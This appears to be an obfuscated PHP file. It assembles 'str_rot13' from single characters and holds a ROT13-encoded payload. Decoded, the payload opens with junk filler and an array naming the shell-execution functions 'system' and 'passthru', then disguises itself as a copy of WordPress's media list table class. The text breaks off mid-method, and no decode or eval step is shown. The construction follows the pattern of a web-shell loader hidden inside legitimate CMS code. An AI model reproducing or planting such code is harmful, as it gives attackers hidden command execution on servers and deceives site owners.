<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Zrqvn_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat zrqvn vgrzf va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Zrqvn_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {
	/**
	 * Ubyqf gur ahzore bs craqvat pbzzragf sbe rnpu cbfg.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	cebgrpgrq $pbzzrag_craqvat_pbhag = neenl();

	cevingr $qrgnpurq;

	cevingr $vf_genfu;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$guvf->qrgnpurq = ( vffrg( $_ERDHRFG['nggnpuzrag-svygre'] ) && 'qrgnpurq' === $_ERDHRFG['nggnpuzrag-svygre'] );

		$guvf->zbqrf = neenl(
			'yvfg' => __( 'Yvfg ivrj' ),
			'tevq' => __( 'Tevq ivrj' ),
		);

		cnerag::__pbafgehpg(
			neenl(
				'cyheny' => 'zrqvn',
				'fperra' => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'hcybnq_svyrf' );
	}

	/**
	 * @tybony fgevat   $zbqr                  Yvfg gnoyr ivrj zbqr.
	 * @tybony JC_Dhrel $jc_dhrel              JbeqCerff Dhrel bowrpg.
	 * @tybony neenl    $cbfg_zvzr_glcrf
	 * @tybony neenl    $ninvy_cbfg_zvzr_glcrf
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $zbqr, $jc_dhrel, $cbfg_zvzr_glcrf, $ninvy_cbfg_zvzr_glcrf;

		$zbqr = rzcgl( $_ERDHRFG['zbqr'] ) ? 'yvfg' : $_ERDHRFG['zbqr'];

		/*
		 * Rkpyhqr nggnpuzragf fpurqhyrq sbe qryrgvba va gur arkg gjb ubhef
		 * vs gurl ner sbe mvc cnpxntrf sbe vagreehcgrq be snvyrq hcqngrf.
		 * Frr Svyr_Hcybnq_Hctenqre pynff.
		 */
		$abg_va = neenl();

		$pebaf = _trg_peba_neenl();

		vs ( vf_neenl( $pebaf ) ) {
			sbernpu ( $pebaf nf $peba ) {
				vs ( vffrg( $peba['hctenqre_fpurqhyrq_pyrnahc'] ) ) {
					$qrgnvyf = erfrg( $peba['hctenqre_fpurqhyrq_pyrnahc'] );

					vs ( ! rzcgl( $qrgnvyf['netf'][0] ) ) {
						$abg_va[] = (vag) $qrgnvyf['netf'][0];
					}
				}
			}
		}

		vs ( ! rzcgl( $_ERDHRFG['cbfg__abg_va'] ) && vf_neenl( $_ERDHRFG['cbfg__abg_va'] ) ) {
			$abg_va = neenl_zretr( neenl_inyhrf( $_ERDHRFG['cbfg__abg_va'] ), $abg_va );
		}

		vs ( ! rzcgl( $abg_va ) ) {
			$_ERDHRFG['cbfg__abg_va'] = $abg_va;
		}

		yvfg( $cbfg_zvzr_glcrf, $ninvy_cbfg_zvzr_glcrf ) = jc_rqvg_nggnpuzragf_dhrel( $_ERDHRFG );

		$guvf->vf_genfu = vffrg( $_ERDHRFG['nggnpuzrag-svygre'] ) && 'genfu' === $_ERDHRFG['nggnpuzrag-svygre'];

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $jc_dhrel->sbhaq_cbfgf,
				'gbgny_cntrf' => $jc_dhrel->znk_ahz_cntrf,
				'cre_cntr'    => $jc_dhrel->dhrel_inef['cbfgf_cre_cntr'],
			)
		);
		vs ( $jc_dhrel->cbfgf ) {
			hcqngr_cbfg_guhzoanvy_pnpur( $jc_dhrel );
			hcqngr_cbfg_cnerag_pnpurf( $jc_dhrel->cbfgf );
		}
	}

	/**
	 * @tybony neenl $cbfg_zvzr_glcrf
	 * @tybony neenl $ninvy_cbfg_zvzr_glcrf
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $cbfg_zvzr_glcrf, $ninvy_cbfg_zvzr_glcrf;

		$glcr_yvaxf = neenl();

		$svygre = rzcgl( $_TRG['nggnpuzrag-svygre'] ) ? '' : $_TRG['nggnpuzrag-svygre'];

		$glcr_yvaxf['nyy'] = fcevags(
			'<bcgvba inyhr=\"\"%f>%f</bcgvba>',
			fryrpgrq( $svygre, gehr, snyfr ),
			__( 'Nyy zrqvn vgrzf' )
		);

		sbernpu ( $cbfg_zvzr_glcrf nf $zvzr_glcr => $ynory ) {
			vs ( ! jc_zngpu_zvzr_glcrf( $zvzr_glcr, $ninvy_cbfg_zvzr_glcrf ) ) {
				pbagvahr;
			}

			$fryrpgrq = fryrpgrq(
				$svygre && fge_fgnegf_jvgu( $svygre, 'cbfg_zvzr_glcr:' ) &&
					jc_zngpu_zvzr_glcrf( $zvzr_glcr, fge_ercynpr( 'cbfg_zvzr_glcr:', '', $svygre ) ),
				gehr,
				snyfr
			);

			$glcr_yvaxf[ $zvzr_glcr ] = fcevags(
				'<bcgvba inyhr=\"cbfg_zvzr_glcr:%f\"%f>%f</bcgvba>',
				rfp_ngge( $zvzr_glcr ),
				$fryrpgrq,
				$ynory[0]
			);
		}

		$glcr_yvaxf['qrgnpurq'] = '<bcgvba inyhr=\"qrgnpurq\"' . ( $guvf->qrgnpurq ? ' fryrpgrq=\"fryrpgrq\"' : '' ) . '>' . _k( 'Hanggnpurq', 'zrqvn vgrzf' ) . '</bcgvba>';

		$glcr_yvaxf['zvar'] = fcevags(
			'<bcgvba inyhr=\"zvar\"%f>%f</bcgvba>',
			fryrpgrq( 'zvar' === $svygre, gehr, snyfr ),
			_k( 'Zvar', 'zrqvn vgrzf' )
		);

		vs ( $guvf->vf_genfu || ( qrsvarq( 'ZRQVN_GENFU' ) && ZRQVN_GENFU ) ) {
			$glcr_yvaxf['genfu'] = fcevags(
				'<bcgvba inyhr=\"genfu\"%f>%f</bcgvba>',
				fryrpgrq( 'genfu' === $svygre, gehr, snyfr ),
				_k( 'Genfu', 'nggnpuzrag svygre' )
			);
		}

		erghea $glcr_yvaxf;
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		$npgvbaf = neenl();

		vs ( ZRQVN_GENFU ) {
			vs ( $guvf->vf_genfu ) {
				$npgvbaf['hagenfu'] = __( 'Erfgber' );
				$npgvbaf['qryrgr']  = __( 'Qryrgr creznaragyl' );
			} ryfr {
				$npgvbaf['genfu'] = __( 'Zbir gb Genfu' );
			}
		} ryfr {
			$npgvbaf['qryrgr'] = __( 'Qryrgr creznaragyl' );
		}

		vs ( $guvf->qrgnpurq ) {
			$npgvbaf['nggnpu'] = __( 'Nggnpu' );
		}

		erghea $npgvbaf;
	}

	/**
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {
		vs ( 'one' !== $juvpu ) {
			erghea;
		}
		?>
		<qvi pynff=\"npgvbaf\">
			<?cuc
			vs ( ! $guvf->vf_genfu ) {
				$guvf->zbaguf_qebcqbja( 'nggnpuzrag' );
			}

			/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-cbfgf-yvfg-gnoyr.cuc */
			qb_npgvba( 'erfgevpg_znantr_cbfgf', $guvf->fperra->cbfg_glcr, $juvpu );

			fhozvg_ohggba( __( 'Svygre' ), '', 'svygre_npgvba', snyfr, neenl( 'vq' => 'cbfg-dhrel-fhozvg' ) );

			vs ( $guvf->vf_genfu && $guvf->unf_vgrzf()
				&& pheerag_hfre_pna( 'rqvg_bguref_cbfgf' )
			) {
				fhozvg_ohggba( __( 'Rzcgl Genfu' ), 'nccyl', 'qryrgr_nyy', snyfr );
			}
			?>
		</qvi>
		<?cuc
	}

	/**
	 * @erghea fgevat
	 */
	choyvp shapgvba pheerag_npgvba() {
		vs ( vffrg( $_ERDHRFG['sbhaq_cbfg_vq'] ) && vffrg( $_ERDHRFG['zrqvn'] ) ) {
			erghea 'nggnpu';
		}

		vs ( vffrg( $_ERDHRFG['cnerag_cbfg_vq'] ) && vffrg( $_ERDHRFG['zrqvn'] ) ) {
			erghea 'qrgnpu';
		}

		vs ( vffrg( $_ERDHRFG['qryrgr_nyy'] ) || vffrg( $_ERDHRFG['qryrgr_nyy2'] ) ) {
			erghea 'qryrgr_nyy';
		}

		erghea cnerag::pheerag_npgvba();
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba unf_vgrzf() {
		erghea unir_cbfgf();
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		vs ( $guvf->vf_genfu ) {
			_r( 'Ab zrqvn svyrf sbhaq va Genfu.' );
		} ryfr {
			_r( 'Ab zrqvn svyrf sbhaq.' );
		}
	}

	/**
	 * Bireevqrf cnerag ivrjf gb hfr gur svygre one qvfcynl.
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 */
	choyvp shapgvba ivrjf() {
		tybony $zbqr;

		$ivrjf = $guvf->trg_ivrjf();

		$guvf->fperra->eraqre_fperra_ernqre_pbagrag( 'urnqvat_ivrjf' );
		?>
		<qvi pynff=\"jc-svygre\">
			<qvi pynff=\"svygre-vgrzf\">
				<?cuc $guvf->ivrj_fjvgpure( $zbqr ); ?>

				<ynory sbe=\"nggnpuzrag-svygre\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Svygre ol glcr' );
					?>
				</ynory>
				<fryrpg pynff=\"nggnpuzrag-svygref\" anzr=\"nggnpuzrag-svygre\" vq=\"nggnpuzrag-svygre\">
					<?cuc
					vs ( ! rzcgl( $ivrjf ) ) {
						sbernpu ( $ivrjf nf $pynff => $ivrj ) {
							rpub \"\g$ivrj\a\";
						}
					}
					?>
				</fryrpg>

				<?cuc
				$guvf->rkgen_gnoyrani( 'one' );

				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-yvfg-gnoyr.cuc */
				$ivrjf = nccyl_svygref( \"ivrjf_{$guvf->fperra->vq}\", neenl() );

				// Onpx pbzcng sbe cer-4.0 ivrj yvaxf.
				vs ( ! rzcgl( $ivrjf ) ) {
					rpub '<hy pynff=\"svygre-yvaxf\">';
					sbernpu ( $ivrjf nf $pynff => $ivrj ) {
						rpub \"<yv pynff='$pynff'>$ivrj</yv>\";
					}
					rpub '</hy>';
				}
				?>
			</qvi>

			<qvi pynff=\"frnepu-sbez\">
				<c pynff=\"frnepu-obk\">
					<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"zrqvn-frnepu-vachg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					rfp_ugzy_r( 'Frnepu Zrqvn' );
					?>
					</ynory>
					<vachg glcr=\"frnepu\" vq=\"zrqvn-frnepu-vachg\" pynff=\"frnepu\" anzr=\"f\" inyhr=\"<?cuc _nqzva_frnepu_dhrel(); ?>\">
					<vachg vq=\"frnepu-fhozvg\" glcr=\"fhozvg\" pynff=\"ohggba\" inyhr=\"<?cuc rfp_ngge_r( 'Frnepu Zrqvn' ); ?>\">
				</c>
			</qvi>
		</qvi>
		<?cuc
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$cbfgf_pbyhzaf       = neenl();
		$cbfgf_pbyhzaf['po'] = '<vachg glcr=\"purpxobk\" />';
		/* genafyngbef: Pbyhza anzr. */
		$cbfgf_pbyhzaf['gvgyr']  = _k( 'Svyr', 'pbyhza anzr' );
		$cbfgf_pbyhzaf['nhgube'] = __( 'Nhgube' );

		$gnkbabzvrf = trg_gnkbabzvrf_sbe_nggnpuzragf( 'bowrpgf' );
		$gnkbabzvrf = jc_svygre_bowrpg_yvfg( $gnkbabzvrf, neenl( 'fubj_nqzva_pbyhza' => gehr ), 'naq', 'anzr' );

		/**
		 * Svygref gur gnkbabzl pbyhzaf sbe nggnpuzragf va gur Zrqvn yvfg gnoyr.
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz fgevat[] $gnkbabzvrf Na neenl bs ertvfgrerq gnkbabzl anzrf gb fubj sbe nggnpuzragf.
		 * @cnenz fgevat   $cbfg_glcr  Gur cbfg glcr. Qrsnhyg 'nggnpuzrag'.
		 */
		$gnkbabzvrf = nccyl_svygref( 'znantr_gnkbabzvrf_sbe_nggnpuzrag_pbyhzaf', $gnkbabzvrf, 'nggnpuzrag' );
		$gnkbabzvrf = neenl_svygre( $gnkbabzvrf, 'gnkbabzl_rkvfgf' );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			vs ( 'pngrtbel' === $gnkbabzl ) {
				$pbyhza_xrl = 'pngrtbevrf';
			} ryfrvs ( 'cbfg_gnt' === $gnkbabzl ) {
				$pbyhza_xrl = 'gntf';
			} ryfr {
				$pbyhza_xrl = 'gnkbabzl-' . $gnkbabzl;
			}

			$cbfgf_pbyhzaf[ $pbyhza_xrl ] = trg_gnkbabzl( $gnkbabzl )->ynoryf->anzr;
		}

		/* genafyngbef: Pbyhza anzr. */
		vs ( ! $guvf->qrgnpurq ) {
			$cbfgf_pbyhzaf['cnerag'] = _k( 'Hcybnqrq gb', 'pbyhza anzr' );

			vs ( cbfg_glcr_fhccbegf( 'nggnpuzrag', 'pbzzragf' ) ) {
				$cbfgf_pbyhzaf['pbzzragf'] = fcevags(
					'<fcna pynff=\"iref pbzzrag-terl-ohooyr\" gvgyr=\"%1$f\" nevn-uvqqra=\"gehr\"></fcna><fcna pynff=\"fperra-ernqre-grkg\">%2$f</fcna>',
					rfp_ngge__( 'Pbzzragf' ),
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( 'Pbzzragf' )
				);
			}
		}

		/* genafyngbef: Pbyhza anzr. */
		$cbfgf_pbyhzaf['qngr'] = _k( 'Qngr', 'pbyhza anzr' );

		/**
		 * Svygref gur Zrqvn yvfg gnoyr pbyhzaf.
		 *
		 * @fvapr 2.5.0
		 *
		 * @cnenz fgevat[] $cbfgf_pbyhzaf Na neenl bs pbyhzaf qvfcynlrq va gur Zrqvn yvfg gnoyr.
		 * @cnenz obby     $qrgnpurq      Jurgure gur yvfg gnoyr pbagnvaf zrqvn abg nggnpurq
		 *                                gb nal cbfgf. Qrsnhyg gehr.
		 */
		erghea nccyl_svygref( 'znantr_zrqvn_pbyhzaf', $cbfgf_pbyhzaf, $guvf->qrgnpurq );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		erghea neenl(
			'gvgyr'    => neenl( 'gvgyr', snyfr, _k( 'Svyr', 'pbyhza anzr' ), __( 'Gnoyr beqrerq ol Svyr Anzr.' ) ),
			'nhgube'   => neenl( 'nhgube', snyfr, __( 'Nhgube' ), __( 'Gnoyr beqrerq ol Nhgube.' ) ),
			'cnerag'   => neenl( 'cnerag', snyfr, _k( 'Hcybnqrq gb', 'pbyhza anzr' ), __( 'Gnoyr beqrerq ol Hcybnqrq Gb.' ) ),
			'pbzzragf' => neenl( 'pbzzrag_pbhag', __( 'Pbzzragf' ), snyfr, __( 'Gnoyr beqrerq ol Pbzzragf.' ) ),
			'qngr'     => neenl( 'qngr', gehr, __( 'Qngr' ), __( 'Gnoyr beqrerq ol Qngr.' ), 'qrfp' ),
		);
	}

	/**
	 * Unaqyrf gur purpxobk pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg $vgrz Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		vs ( pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
			?>
			<vachg glcr=\"purpxobk\" anzr=\"zrqvn[]\" vq=\"po-fryrpg-<?cuc rpub $cbfg->VQ; ?>\" inyhr=\"<?cuc rpub $cbfg->VQ; ?>\" />
			<ynory sbe=\"po-fryrpg-<?cuc rpub $cbfg->VQ; ?>\">
				<fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Nggnpuzrag gvgyr. */
				cevags( __( 'Fryrpg %f' ), _qensg_be_cbfg_gvgyr() );
				?>
				</fcna>
			</ynory>
			<?cuc
		}
	}

	/**
	 * Unaqyrf gur gvgyr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_gvgyr( $cbfg ) {
		yvfg( $zvzr ) = rkcybqr( '/', $cbfg->cbfg_zvzr_glcr );

		$nggnpuzrag_vq = $cbfg->VQ;

		vs ( unf_cbfg_guhzoanvy( $cbfg ) ) {
			$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg );

			vs ( ! rzcgl( $guhzoanvy_vq ) ) {
				$nggnpuzrag_vq = $guhzoanvy_vq;
			}
		}

		$gvgyr      = _qensg_be_cbfg_gvgyr();
		$guhzo      = jc_trg_nggnpuzrag_vzntr( $nggnpuzrag_vq, neenl( 60, 60 ), gehr, neenl( 'nyg' => '' ) );
		$yvax_fgneg = '';
		$yvax_raq   = '';

		vs ( pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) && ! $guvf->vf_genfu ) {
			$yvax_fgneg = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">',
				trg_rqvg_cbfg_yvax( $cbfg->VQ ),
				/* genafyngbef: %f: Nggnpuzrag gvgyr. */
				rfp_ngge( fcevags( __( '&#8220;%f&#8221; (Rqvg)' ), $gvgyr ) )
			);
			$yvax_raq = '</n>';
		}

		$pynff = $guhzo ? ' pynff=\"unf-zrqvn-vpba\"' : '';
		?>
		<fgebat<?cuc rpub $pynff; ?>>
			<?cuc
			rpub $yvax_fgneg;

			vs ( $guhzo ) :
				?>
				<fcna pynff=\"zrqvn-vpba <?cuc rpub fnavgvmr_ugzy_pynff( $zvzr . '-vpba' ); ?>\"><?cuc rpub $guhzo; ?></fcna>
				<?cuc
			raqvs;

			rpub $gvgyr . $yvax_raq;

			_zrqvn_fgngrf( $cbfg );
			?>
		</fgebat>
		<c pynff=\"svyranzr\">
			<fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Svyr anzr:' );
				?>
			</fcna>
			<?cuc
			$svyr = trg_nggnpurq_svyr( $cbfg->VQ );
			rpub rfp_ugzy( jc_onfranzr( $svyr ) );
			?>
		</c>
		<?cuc
	}

	/**
	 * Unaqyrf gur nhgube pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 6.8.0 Nqqrq snyyonpx grkg jura nhgube'f anzr vf haxabja.
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_nhgube( $cbfg ) {
		$nhgube = trg_gur_nhgube();

		vs ( ! rzcgl( $nhgube ) ) {
			cevags(
				'<n uers=\"%f\">%f</n>',
				rfp_hey( nqq_dhrel_net( neenl( 'nhgube' => trg_gur_nhgube_zrgn( 'VQ' ) ), 'hcybnq.cuc' ) ),
				rfp_ugzy( $nhgube )
			);
		} ryfr {
			rpub '<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna><fcna pynff=\"fperra-ernqre-grkg\">' . __( '(ab nhgube)' ) . '</fcna>';
		}
	}

	/**
	 * Unaqyrf gur qrfpevcgvba pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @qrcerpngrq 6.2.0
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_qrfp( $cbfg ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.2.0' );

		rpub unf_rkprecg() ? $cbfg->cbfg_rkprecg : '';
	}

	/**
	 * Unaqyrf gur qngr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_qngr( $cbfg ) {
		vs ( '0000-00-00 00:00:00' === $cbfg->cbfg_qngr ) {
			$u_gvzr = __( 'Hachoyvfurq' );
		} ryfr {
			$gvzr      = trg_cbfg_gvzrfgnzc( $cbfg );
			$gvzr_qvss = gvzr() - $gvzr;

			vs ( $gvzr && $gvzr_qvss > 0 && $gvzr_qvss < QNL_VA_FRPBAQF ) {
				/* genafyngbef: %f: Uhzna-ernqnoyr gvzr qvssrerapr. */
				$u_gvzr = fcevags( __( '%f ntb' ), uhzna_gvzr_qvss( $gvzr ) );
			} ryfr {
				$u_gvzr = trg_gur_gvzr( __( 'L/z/q' ), $cbfg );
			}
		}

		/**
		 * Svygref gur choyvfurq gvzr bs na nggnpuzrag qvfcynlrq va gur Zrqvn yvfg gnoyr.
		 *
		 * @fvapr 6.0.0
		 *
		 * @cnenz fgevat  $u_gvzr      Gur choyvfurq gvzr.
		 * @cnenz JC_Cbfg $cbfg        Nggnpuzrag bowrpg.
		 * @cnenz fgevat  $pbyhza_anzr Gur pbyhza anzr.
		 */
		rpub nccyl_svygref( 'zrqvn_qngr_pbyhza_gvzr', $u_gvzr, $cbfg, 'qngr' );
	}

	/**
	 * Unaqyrf gur cnerag pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_cnerag( $cbfg ) {
		$hfre_pna_rqvg = pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ );

		vs ( $cbfg->cbfg_cnerag > 0 ) {
			$cnerag = trg_cbfg( $cbfg->cbfg_cnerag );
		} ryfr {
			$cnerag = snyfr;
		}

		vs ( $cnerag ) {
			$gvgyr       = _qensg_be_cbfg_gvgyr( $cbfg->cbfg_cnerag );
			$cnerag_glcr = trg_cbfg_glcr_bowrpg( $cnerag->cbfg_glcr );

			vs ( $cnerag_glcr && $cnerag_glcr->fubj_hv && pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->cbfg_cnerag ) ) {
				cevags( '<fgebat><n uers=\"%f\">%f</n></fgebat>', trg_rqvg_cbfg_yvax( $cbfg->cbfg_cnerag ), $gvgyr );
			} ryfrvs ( $cnerag_glcr && pheerag_hfre_pna( 'ernq_cbfg', $cbfg->cbfg_cnerag ) ) {
				cevags( '<fgebat>%f</fgebat>', $gvgyr );
			} ryfr {
				_r( '(Cevingr cbfg)' );
			}

			vs ( $hfre_pna_rqvg ) :
				$qrgnpu_hey = nqq_dhrel_net(
					neenl(
						'cnerag_cbfg_vq' => $cbfg->cbfg_cnerag,
						'zrqvn[]'        => $cbfg->VQ,
						'_jcabapr'       => jc_perngr_abapr( 'ohyx-' . $guvf->_netf['cyheny'] ),
					),
					'hcybnq.cuc'
				);
				cevags(
					'<oe /><n uers=\"%f\" pynff=\"uvqr-vs-ab-wf qrgnpu-sebz-cnerag\" nevn-ynory=\"%f\">%f</n>',
					$qrgnpu_hey,
					/* genafyngbef: %f: Gvgyr bs gur cbfg gur nggnpuzrag vf nggnpurq gb. */
					rfp_ngge( fcevags( __( 'Qrgnpu sebz &#8220;%f&#8221;' ), $gvgyr ) ),
					__( 'Qrgnpu' )
				);
			raqvs;
		} ryfr {
			_r( '(Hanggnpurq)' );
			?>
			<?cuc
			vs ( $hfre_pna_rqvg ) {
				$gvgyr = _qensg_be_cbfg_gvgyr( $cbfg->cbfg_cnerag );
				cevags(
					'<oe /><n uers=\"#gur-yvfg\" bapyvpx=\"svaqCbfgf.bcra( \'zrqvn[]\', \'%f\' ); erghea snyfr;\" pynff=\"uvqr-vs-ab-wf nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
					$cbfg->VQ,
					/* genafyngbef: %f: Nggnpuzrag gvgyr. */
					rfp_ngge( fcevags( __( 'Nggnpu &#8220;%f&#8221; gb rkvfgvat pbagrag' ), $gvgyr ) ),
					__( 'Nggnpu' )
				);
			}
		}
	}

	/**
	 * Unaqyrf gur pbzzragf pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_pbzzragf( $cbfg ) {
		rpub '<qvi pynff=\"cbfg-pbz-pbhag-jenccre\">';

		vs ( vffrg( $guvf->pbzzrag_craqvat_pbhag[ $cbfg->VQ ] ) ) {
			$craqvat_pbzzragf = $guvf->pbzzrag_craqvat_pbhag[ $cbfg->VQ ];
		} ryfr {
			$craqvat_pbzzragf = trg_craqvat_pbzzragf_ahz( $cbfg->VQ );
		}

		$guvf->pbzzragf_ohooyr( $cbfg->VQ, $craqvat_pbzzragf );

		rpub '</qvi>';
	}

	/**
	 * Unaqyrf bhgchg sbe gur qrsnhyg pbyhza.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg $vgrz        Gur pheerag JC_Cbfg bowrpg.
	 * @cnenz fgevat  $pbyhza_anzr Pheerag pbyhza anzr.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		vs ( 'pngrtbevrf' === $pbyhza_anzr ) {
			$gnkbabzl = 'pngrtbel';
		} ryfrvs ( 'gntf' === $pbyhza_anzr ) {
			$gnkbabzl = 'cbfg_gnt';
		} ryfrvs ( fge_fgnegf_jvgu( $pbyhza_anzr, 'gnkbabzl-' ) ) {
			$gnkbabzl = fhofge( $pbyhza_anzr, 9 );
		} ryfr {
			$gnkbabzl = snyfr;
		}

		vs ( $gnkbabzl ) {
			$grezf = trg_gur_grezf( $cbfg->VQ, $gnkbabzl );

			vs ( vf_neenl( $grezf ) ) {
				$bhgchg = neenl();

				sbernpu ( $grezf nf $g ) {
					$cbfgf_va_grez_di             = neenl();
					$cbfgf_va_grez_di['gnkbabzl'] = $gnkbabzl;
					$cbfgf_va_grez_di['grez']     = $g->fyht;

					$bhgchg[] = fcevags(
						'<n uers=\"%f\">%f</n>',
						rfp_hey( nqq_dhrel_net( $cbfgf_va_grez_di, 'hcybnq.cuc' ) ),
						rfp_ugzy( fnavgvmr_grez_svryq( 'anzr', $g->anzr, $g->grez_vq, $gnkbabzl, 'qvfcynl' ) )
					);
				}

				rpub vzcybqr( jc_trg_yvfg_vgrz_frcnengbe(), $bhgchg );
			} ryfr {
				rpub '<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna><fcna pynff=\"fperra-ernqre-grkg\">' . trg_gnkbabzl( $gnkbabzl )->ynoryf->ab_grezf . '</fcna>';
			}

			erghea;
		}

		/**
		 * Sverf sbe rnpu phfgbz pbyhza va gur Zrqvn yvfg gnoyr.
		 *
		 * Phfgbz pbyhzaf ner ertvfgrerq hfvat gur {@frr 'znantr_zrqvn_pbyhzaf'} svygre.
		 *
		 * @fvapr 2.5.0
		 *
		 * @cnenz fgevat $pbyhza_anzr Anzr bs gur phfgbz pbyhza.
		 * @cnenz vag    $cbfg_vq     Nggnpuzrag VQ.
		 */
		qb_npgvba( 'znantr_zrqvn_phfgbz_pbyhza', $pbyhza_anzr, $cbfg->VQ );
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony JC_Cbfg  $cbfg     Tybony cbfg bowrpg.
	 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		tybony $cbfg, $jc_dhrel;

		$cbfg_vqf = jc_yvfg_cyhpx( $jc_dhrel->cbfgf, 'VQ' );
		erfrg( $jc_dhrel->cbfgf );

		$guvf->pbzzrag_craqvat_pbhag = trg_craqvat_pbzzragf_ahz( $cbfg_vqf );

		nqq_svygre( 'gur_gvgyr', 'rfp_ugzy' );

		juvyr ( unir_cbfgf() ) :
			gur_cbfg();

